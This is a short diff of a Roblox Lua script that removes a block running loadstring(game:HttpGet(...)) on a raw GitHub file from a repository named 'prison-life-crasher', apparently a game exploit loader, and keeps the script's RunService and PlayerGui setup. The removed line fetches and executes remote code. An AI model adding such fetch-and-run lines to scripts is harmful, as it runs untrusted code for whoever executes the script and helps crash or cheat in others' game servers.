@@ -1,15 +1,3 @@
-if not _G.hasExecuted1 then
-
-_G.ScriptIs = "Ascend GUI"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sauce-boss01/prison-life-crasher/main/a", true))()
-
-_G.hasExecuted1 = true
-
-else
-	warn("real")
-end
-
 local RunService = game:GetService("RunService")
 local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
